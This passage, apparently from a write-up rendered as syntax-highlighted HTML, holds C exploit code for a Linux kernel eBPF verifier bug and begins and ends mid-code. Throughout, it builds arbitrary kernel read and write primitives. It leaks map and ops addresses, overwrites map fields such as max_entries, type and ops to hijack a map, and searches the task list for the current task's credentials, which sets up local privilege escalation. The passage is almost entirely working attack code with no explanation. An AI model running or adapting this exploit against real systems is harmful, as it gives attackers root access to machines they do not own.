</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">READ_ARBITRARY_ADDR</span><span style="color:#c0c5ce;">(map_fd, idx), 
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_info info;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">info</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">bpf_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">info</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">info_len </span><span style="color:#c0c5ce;">= sizeof(info),
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">info</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">info </span><span style="color:#c0c5ce;">= (uint64_t) &amp;info,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">    size_t data;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;info, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(info));
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    data = info.</span><span style="color:#bf616a;">btf_id</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> data;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    size_t data;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">    size_t value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = addr;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to load value into map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = addr + </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to load value into map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    data = </span><span style="color:#8fa1b3;">read_arbitrary_addr_4_bytes</span><span style="color:#c0c5ce;">(map_fd, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    data &lt;&lt;= </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    data += </span><span style="color:#8fa1b3;">read_arbitrary_addr_4_bytes</span><span style="color:#c0c5ce;">(map_fd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> data;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t current_task, current_cred;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">search_for_current_task</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    size_t next_task = INIT_TASK + kernel_offset + </span><span style="color:#d08770;">0x818</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    size_t data;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">prctl</span><span style="color:#c0c5ce;">(PR_SET_NAME, &quot;</span><span style="color:#a3be8c;">arttnba3</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">do </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        next_task = </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(map_fd, next_task);
</span><span style="color:#c0c5ce;">        data = </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(map_fd, next_task + </span><span style="color:#d08770;">0x2d0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(data != *(size_t*) &quot;</span><span style="color:#a3be8c;">arttnba3</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> next_task - </span><span style="color:#d08770;">0x818</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">LEAK_MAP_ADDR</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV32_REG</span><span style="color:#c0c5ce;">(VULN_REG, VULN_REG),              \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_8), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_8, BPF_REG_7, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t map_addr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">leak_map_addr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">LEAK_MAP_ADDR</span><span style="color:#c0c5ce;">(map_fd), 
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">LEAK_MAP_OPS</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* extend the alu-&gt;limit and do the oob read */ </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, BPF_REG_8, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0x110</span><span style="color:#c0c5ce;">),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_8, BPF_REG_7, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* save the value into map */                   </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t map_ops_addr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">leak_map_ops_addr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">LEAK_MAP_OPS</span><span style="color:#c0c5ce;">(map_fd), 
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">MAKE_ARBITRARY_WRITE_OPS</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* extend the alu_limit */                      </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, BPF_REG_8, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite spin_lock_off */                   </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0xE4</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_5, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">),               \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite max_entries */                     </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_5, </span><span style="color:#d08770;">0xffffffff</span><span style="color:#c0c5ce;">),           \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite map type */                        </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0xC</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_5, </span><span style="color:#d08770;">23</span><span style="color:#c0c5ce;">),                   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite the map-&gt;ops */                    </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_4), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_5, BPF_REG_4, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t fake_ops_addr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">make_arbitrary_write_ops</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MAKE_ARBITRARY_WRITE_OPS</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">    size_t per_ops_ptr, value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">], value_idx;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_ops *ops_data;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* save fake ops addr into map */
</span><span style="color:#c0c5ce;">    fake_ops_addr = map_addr + </span><span style="color:#d08770;">0x110 </span><span style="color:#c0c5ce;">+ MAP_SIZE;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* read ops */
</span><span style="color:#c0c5ce;">    value_idx = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(size_t i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_ops); i += </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        per_ops_ptr = </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(map_fd, map_ops_addr + i);
</span><span style="color:#c0c5ce;">        value[value_idx++] = per_ops_ptr;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* load ops */
</span><span style="color:#c0c5ce;">    ops_data = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_ops *) value;
</span><span style="color:#c0c5ce;">    ops_data-&gt;map_push_elem = (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up value!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* we&#39;ll take fake ops&#39;s addr from map */
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = fake_ops_addr;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up value!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* hijack the map */
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">arbitrary_write_4_bytes_by_map</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">val</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    size_t value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = val - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], addr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">READ_MAP_DATA</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">__off</span><span style="color:#c0c5ce;">)                      \
